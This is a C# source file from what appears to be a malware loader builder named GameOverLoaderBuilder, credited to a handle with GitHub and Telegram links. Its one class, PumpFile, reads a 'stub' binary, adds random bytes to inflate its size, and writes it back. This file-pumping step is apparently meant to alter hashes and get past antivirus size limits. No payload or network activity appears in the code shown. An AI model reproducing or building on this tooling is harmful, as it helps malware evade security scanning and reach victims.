namespace GameOverLoaderBuilder.Tools
{
    using System;

    /*
        Created by r3xq1
        https://github.com/r3xq1/
        Telegram: https://t.me/r3xq1
    */

    public static class PumpFile
    {
        public static void Inizialize(string path, int size) 
        {
            try
            {
                var newrnd = new SafeRandom();
                byte[] stubdata = FileManager.ReadBinaryFile(path);
                byte[] pump = new byte[size * 1024];
                newrnd.NextBytes(pump);
                Array.Resize(ref stubdata, stubdata.Length + pump.Length);
                Array.Copy(pump, 0, stubdata, stubdata.Length - pump.Length, pump.Length);
                FileManager.PackBytesInFile(path, stubdata);
            }
            catch (Exception ex) { throw new Exception("Error Pump to File", ex); }
        }
    }
}